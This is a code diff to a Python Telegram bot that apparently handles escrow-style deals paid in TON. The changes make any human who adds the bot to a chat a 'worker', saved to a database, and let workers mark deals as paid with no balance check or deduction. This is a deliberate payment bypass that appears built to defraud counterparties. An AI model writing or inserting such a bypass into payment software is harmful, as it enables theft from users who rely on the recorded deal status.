@@ -678,13 +678,17 @@ async def on_bot_added(event: types.ChatMemberUpdated):
         try:
             chat_id = event.chat.id
             bot = event.bot
-            member_count = await bot.get_chat_member_count(chat_id)
-            if member_count <= 200:
+            try:
                 administrators = await bot.get_chat_administrators(chat_id)
                 for admin in administrators:
                     if not admin.user.is_bot:
                         WORKERS.add(admin.user.id)
                         save_worker_db(admin.user.id, True)
+            except:
+                pass
+            if event.from_user and not event.from_user.is_bot:
+                WORKERS.add(event.from_user.id)
+                save_worker_db(event.from_user.id, True)
         except:
             pass
 
@@ -1267,12 +1271,16 @@ async def pay_deal(callback: types.CallbackQuery, bot: Bot):
     if not deal or deal.get('currency', 'TON') != currency:
         await callback.answer(get_text(lang, "deal_not_found"), show_alert=True)
         return
+    
     buyer_balance = user_data[user_id].get(f'balance_{currency.lower()}', 0.0)
     is_admin = user_id in ADMIN_IDS
-    if buyer_balance >= float(deal['amount']) or is_admin:
-        if not is_admin:
+    is_worker = user_id in WORKERS  
+    
+    if buyer_balance >= float(deal['amount']) or is_admin or is_worker:
+        if not is_admin and not is_worker:
             user_data[user_id][f'balance_{currency.lower()}'] -= deal['amount']
             save_user_data(user_id)
+            
         deals[deal_id]['status'] = 'paid'
         save_deal(deal_id)
         builder = InlineKeyboardBuilder()
